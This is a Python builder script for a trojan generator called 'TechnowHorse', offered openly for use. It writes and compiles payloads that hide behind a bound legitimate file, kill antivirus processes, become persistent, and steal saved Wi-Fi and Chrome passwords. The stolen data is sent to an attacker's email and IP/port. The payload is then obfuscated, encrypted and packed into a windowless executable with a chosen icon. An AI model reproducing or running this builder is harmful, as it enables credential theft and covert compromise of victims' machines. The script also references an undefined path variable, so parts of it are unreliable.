#!/usr/bin/env python3
import encrypt_code
import os
import argparse
import subprocess
import shutil
import banners
import platform
from essential_generators import DocumentGenerator

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

if platform.system() == 'Windows':
    PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
    Attacker_System = 'Windows'
elif platform.system() == 'Linux':
    Attacker_System = 'Linux'
    PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"

def get_options():
    parser = argparse.ArgumentParser(description=f'{RED}TechnowHorse v1.6')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10) 
    parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.") 
    parser.add_argument("-k", "--kill_av", dest="kill_av", help="AntivirusKiller : Specify AV's .exe which need to be killed. Ex:- --kill_av cmd.exe") 
    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{RED}Supported OS : Windows{YELLOW}]", action='store_true')

    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")    
    required_arguments.add_argument("--ip", dest="ip", help="Email address to send reports to.")
    required_arguments.add_argument("--port", dest="port", help="Port of the IP Address given in the --ip argument.")
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send \'TrojanHorse Started\' Notification with other Juicy Info.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--output", dest="output", help="Output file name.", required=True)
    return parser.parse_args()

def get_python_pyinstaller_path():
    try:
        if os.name in ('ce', 'nt', 'dos'): 
            # If OS == Windows
            python_path = subprocess.check_output("where pyinstaller.exe", shell=True)

        elif 'posix' in os.name:
            # If OS == Linux
            python_path = subprocess.check_output("which pyinstaller.exe", shell=True)

        python_path = str(python_path).split('\'')[1]
        python_path = python_path.replace("\\n", "")
        python_path = python_path.replace("\\r", "")
        python_path = python_path.replace("\\\\", "/")  
    except Exception:
        python_path = "UnableToFind"

    return python_path

def check_dependencies():
    print(f"{YELLOW}\n[*] Checking Dependencies...")
    try:
        import mss, essential_generators, PyInstaller, six
        print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
    except Exception as e:
        print(f"[!] Error : {e}")
        try:
            print(f"{YELLOW}[*] Installing All Dependencies From Scratch...\n")
            print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
            import pip
            while 1:
                pip.main(['install', 'mss==4.0.3'])
                pip.main(['install', 'essential_generators==0.9.2'])
                pip.main(['install', 'PyInstaller'])
                pip.main(['install', 'six==1.12.0']) 
                pip.main(['install', 'python-xlib==0.25'])
                print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                print(f"{GREEN}\n[+] Dependencies installed correctly ;)\n")
                break
        except:
            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")
            quit()

def create_trojan(file_name, email, password, ip, port, time_persistent, legitimate_file=None):    
    with open(file_name, "w+") as file:
        file.write("import payload, win32event, winerror, win32api\n")
        if arguments.stealer:
            file.write("import password_stealer\n") 
        if arguments.bind or arguments.stealer:
            file.write("import threading\n\n")             

        if arguments.bind != None:
            #Codes to Run, Legitimate File on Front End            
            file.write("import subprocess, sys\n\n")        
            file.write("def run_front_file():\n")        
            file.write(f"\tfile_name = sys._MEIPASS.replace('\\\\', '/') + \"/{legitimate_file}\" \n")       
            file.write(f"\tsubprocess.call(file_name, shell=True)\n\n")
            
            #Running Front End File on Different Thread
            file.write("t1 = threading.Thread(target=run_front_file)\n")
            file.write("t1.start()\n\n")

        #Below Codes will check for already running instance,
        file.write("\nmutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')\n\n")
        
        if arguments.stealer:
            #Saved Password Stealer 
            file.write("def steal():\n")
            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
            file.write(f"\tsteal.get_wifi_creds()\n")
            file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
            file.write(f"\tsteal.get_chrome_browser_creds()\n")
            file.write(f"\tprint(\"[+] Chrome Browser Password Send Successfully!\")\n\n")          
        
        file.write("def check_and_start():\n")
        file.write("\tif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n")
        file.write("\t\tmutex = None\n")
        file.write("\t\tprint(\"[+] Disabling TechNowHorse: Already Running\")\n")

        file.write("\telse:\n")  # if no instance running, going to run TechNowHorse
        
        if arguments.stealer:
            file.write(f"\t\tt2 = threading.Thread(target=steal)\n")    #Making Stealer Thread  
            file.write(f"\t\tt2.start()\n\n")                           #Starting Thread        

        file.write(f"\t\ttechnowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
        if arguments.kill_av != None and arguments.kill_av != "":
            file.write(f"\t\ttechnowHorse.kill_av({arguments.kill_av})\n") 
        else:
            file.write("\t\ttechnowHorse.kill_av()\n")             
        file.write(f"\t\ttechnowHorse.become_persistent({time_persistent})\n") 
        file.write("\t\ttechnowHorse.start()\n\n")     
        file.write("check_and_start()\n")   

def create_trojan_linux(file_name, email, password, ip, port, time_persistent):    
    with open(file_name, "w+") as file:
        file.write("import payload\n")
        
        file.write(f"technowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")             
        file.write(f"technowHorse.become_persistent({time_persistent})\n") 
        file.write("technowHorse.start()\n\n")     
                
        
def obfuscating_payload(file_name):
    gen = DocumentGenerator()
    text = "#" + gen.sentence() 
    with open(file_name, "a") as file:
        file.write(text)
        
def compile_for_windows(file_name):
    if arguments.bind != None and arguments.stealer:
        subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)                

    elif arguments.bind != None:
        subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon} --add-data \"{arguments.bind};.\"", shell=True)

    elif arguments.stealer:
        subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload --hidden-import=password_stealer {file_name} -i {arguments.icon}", shell=True)                

    else:
        subprocess.call(f"{PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=win32event --hidden-import=winerror --hidden-import=win32api --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)

def compile_for_linux(file_name):
    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=payload {file_name} -i {arguments.icon}", shell=True)
    
def del_junk_file(file_name):
    try:
        if platform.system() == 'Windows':        
            build = os.getcwd() + "\\build"
            file_name = os.getcwd() + f"\\{file_name}"
            pycache = os.getcwd() + "\\__pycache__"
            os.remove(file_name)
            os.remove(file_name + ".spec")    
            shutil.rmtree(build)
            shutil.rmtree(pycache)
        if platform.system() == 'Linux':   
            file_spec = file_name + ".spec"
            os.system(f"rm -r build/ __pycache__/ {file_spec} {file_name}")                    
    except Exception:
        pass
    
def exit_greet():
    try:
        os.system('cls')
    except Exception as e:
        os.system('clear')   
    del_junk_file(arguments.output)
    print(GREEN + '''Thank You for using TechNowHorse, Think Great & Touch The Sky!  \n''' + END)
    quit()    

if __name__ == '__main__':
    if Attacker_System == 'Windows':
        try:
            shutil.rmtree(os.getcwd() + "\\dist")
        except Exception:
            pass
    else:
        try:
            os.system('rm -Rf dist')
        except Exception:
            pass
        
    try:
        print(banners.get_banner())
        print(f"\t\t{YELLOW}Author: {GREEN}Pushpender | {YELLOW}Website: {GREEN}technowlogy.tk\n")
          
        arguments = get_options()
        
        if arguments.icon == None:
            arguments.icon = input(f'{RED}[!] Please Specify Icon Path {WHITE}[{GREEN}LEAVE BLANK to SET icon/exe.ico as icon{WHITE}] : ')
            if arguments.icon == "":
                arguments.icon = "icon/exe.ico"     
            
        if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
            WINDOWS_PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
            if WINDOWS_PYTHON_PYINSTALLER_PATH == "UnableToFind":
                print(f'{RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
                print(f'{RED}[!] {WHITE}[Please Update Line 19 Later] [{RED}DefautPath: {WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
                WINDOWS_PYTHON_PYINSTALLER_PATH = "wine "
                WINDOWS_PYTHON_PYINSTALLER_PATH += input(f'\n{WHITE}[?] Enter pyinstaller.exe path manually : ')            
        
        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
        print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
        print(f'   {YELLOW}Password:{RED} ' + arguments.password) 
        print(f'   {YELLOW}IP Address:{RED} ' + arguments.ip)
        print(f'   {YELLOW}Port:{RED} ' + arguments.port)         
        print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.output)
        print(f'   {YELLOW}Becoming Persistence After:{RED} ' + str(arguments.time_persistent) + f'{YELLOW} seconds') 
        print(f'   {YELLOW}Icon Path:{RED} ' + arguments.icon)

        if arguments.bind != None:
            print(f'   {YELLOW}Binding To [{RED}Legitimate File Path{YELLOW}]:{RED} ' + str(arguments.bind))
            
        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
        
        ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) : ')
    
        if ask.lower() == 'y':
            pass
        else:
            arguments.email = input('\n[?] Type your gmail to receive logs: ')
            arguments.password = input('[?] Type your gmail password: ')
            arguments.ip = input('[?] LHOST or IP Address: ')  
            arguments.port = int(input('[?] LPORT: ')) 
            arguments.time_persistent = int(input('[?] Time After which it should become persistence; [In Seconds]: '))            
            arguments.output = input('[?] Output Evil File Name: ')
            arguments.icon = input(f'[?] Icon Path [{RED}If Present In This Directory, then just type Name{WHITE}]: ')  
            if arguments.bind != None:
                arguments.bind = input(f'[?] Path of Legitimate File [{RED}.exe is Recommended{WHITE}]: ')            

        check_dependencies()

        print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")        
        
        if Attacker_System == 'Linux':
            if arguments.linux:
                create_trojan_linux(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent)
        
        if Attacker_System == 'Windows' and arguments.linux:
            print(f"{RED}[!] Linux payload can't be compiled from windows machine")
            print(f"{YELLOW}[*] Making Payload for Windows ...\n")
        
        if arguments.windows:
            create_trojan(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port, arguments.time_persistent, arguments.bind)
        
        obfuscating_payload(arguments.output)
        
        encrypting_code = encrypt_code.Encrypt()
        encrypting_code.encrypt(arguments.output)

        print(f"{YELLOW}[*] Compiling your payload, Please Wait for a while...")

        print(f"{MAGENTA}")        

        if arguments.windows:
            compile_for_windows(arguments.output)

        elif arguments.linux:
            compile_for_linux(arguments.output)
            
        else:
            print(f"{RED}[!] Please Specify {YELLOW}-w{RED} for {GREEN}WINDOWS{RED} or {YELLOW}-l{RED} for {GREEN}LINUX{RED} payload generation")            
            
        print(f"\n{YELLOW}[*] Deleting Junk Files...")
        del_junk_file(arguments.output)
        print(f"{GREEN}[+] Junk Files Removed Successfully!")
        
        if os.path.exists(f'dist/{arguments.output}.exe') or os.path.exists(f'dist/{arguments.output}'):
            print(f"\n{GREEN}[+] Generated Successfully!\n")           
            print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
            print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")  
            print(f"\n{RED} :O-) TIP{YELLOW} : USE ICONS from {RED}icon{YELLOW} folder like this >>  {RED}--icon icon/exe.ico")            

        else:
            print(f"\n{RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
            print(f"\n{GREEN}[:D] Please Contact us on https://github.com/Technowlogy-Pushpender/technowhorse\n")  
    
    except KeyboardInterrupt:        
        exit_greet()
 
